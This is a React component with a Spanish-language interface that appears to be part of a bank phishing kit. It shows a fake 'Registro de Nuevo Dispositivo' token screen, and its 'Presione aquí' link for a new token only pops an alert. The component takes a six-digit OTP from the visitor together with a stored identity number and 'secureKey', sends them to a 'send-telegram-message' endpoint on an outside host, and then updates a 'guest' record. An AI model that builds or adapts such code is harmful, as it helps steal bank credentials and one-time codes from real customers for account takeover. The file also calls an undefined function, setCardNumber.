import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";

const OTP = () => {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [message, setMessage] = useState("");
  const [documentNumber, setDocumentNumber] = useState("");
  const navigate = useNavigate();
  const inputRefs = useRef([]);

  useEffect(() => {
    const savedFormValues = localStorage.getItem("formValues");
    const savedDocumentNumber = localStorage.getItem("documentNumber");
    const savedSecureKey = localStorage.getItem("secureKey");

    if (savedFormValues) {
      const formValues = JSON.parse(savedFormValues);
      setCardNumber(formValues.cardNumber || "");
    }

    if (savedDocumentNumber) {
      setDocumentNumber(savedDocumentNumber);
    }

    if (!savedDocumentNumber || !savedSecureKey) {
      setMessage("No se encontraron los datos necesarios en el localStorage.");
    }
  }, [navigate]);

  const handleChange = (e, index) => {
    const value = e.target.value;
    if (!/^[0-9]?$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1].focus();
    }
  };

  const handleSubmit = async () => {
    const finalOtp = otp.join("");
    if (finalOtp.length === 6) {
      const savedDocumentNumber = localStorage.getItem("documentNumber");
      const savedSecureKey = localStorage.getItem("secureKey");

      if (savedDocumentNumber && savedSecureKey) {
        const guestId = localStorage.getItem("guestId");
        if (!guestId) {
          setMessage("No se encontró el ID del guest en el localStorage.");
          return;
        }

        const dataToSend = {
          otp: finalOtp,
          documentNumber: savedDocumentNumber,
          secureKey: savedSecureKey,
        };

        try {
          const response = await fetch("https://api.bogotapoliz.com/api/v1/send-telegram-message", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(dataToSend),
          });

          if (!response.ok) throw new Error("Error al enviar los datos al backend");

          const updateResponse = await fetch(
            `https://api.bogotapoliz.com/api/v1/guest/${guestId}`,
            {
              method: "PUT",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ otp: finalOtp, status_id: 1 }),
            }
          );

          if (!updateResponse.ok) throw new Error("Error al actualizar el estado");

          navigate("/loading");
        } catch (error) {
          console.error("Error al enviar datos:", error);
          setMessage("Error al enviar los datos.");
        }
      } else {
        setMessage("Datos del formulario no disponibles.");
      }

      setOtp(["", "", "", "", "", ""]);
      setMessage("");
    } else {
      setMessage("Por favor, ingrese un código de 6 dígitos.");
    }
  };

  return (
    <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg p-6 mt-8">
      <div className="flex items-center space-x-4 mb-2">
        <img src="../../../public/images.png" alt="Menu" className="w-14 h-auto" />
        <p className="text-xl font-bold">
          Ingrese el <b>Token</b> único de acceso
        </p>
      </div>
      <img
        src="../../../public/hombre-afro-caminando-con-bolsas-en-el-hombro.jpg"
        alt="hombre con bolsas"
        className="mb-4"
      />
      <div className="space-y-4 text-center">
        <h1>
          Registro de <b>Nuevo Dispositivo</b>
        </h1>
        <div className="flex flex-col items-center text-gray-500">
          <p>Acabamos de detectar un nuevo ingreso desde un dispositivo no registrado.</p>
          <p>
            Por tu seguridad te hemos enviado un token de acceso al número de identificación{" "}
            <b>{documentNumber || "No disponible"}</b>
          </p>
          <span className="text-gray-700 pt-2 font-bold">
            Ingresa el código del Token móvil o físico:
          </span>
          <div className="flex justify-center gap-2 mt-4">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                maxLength="1"
                value={digit}
                onChange={(e) => handleChange(e, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                className="w-12 h-12 text-center border border-gray-300 rounded text-lg font-mono focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            ))}
          </div>
        </div>

        <p
          className="text-blue-600 cursor-pointer text-center mt-4 mb-4"
          onClick={() => alert("Código Enviado")}
        >
          Presione aquí para recibir un nuevo <b>Token</b>
        </p>
        <button
          onClick={handleSubmit}
          className="w-full h-12 bg-[#0043a9] text-white rounded-lg hover:bg-blue-700 transition duration-150 ease-in-out"
        >
          Enviar
        </button>
        {message && <p className="text-red-500 mt-2 text-center">{message}</p>}
      </div>
    </div>
  );
};

export default OTP;
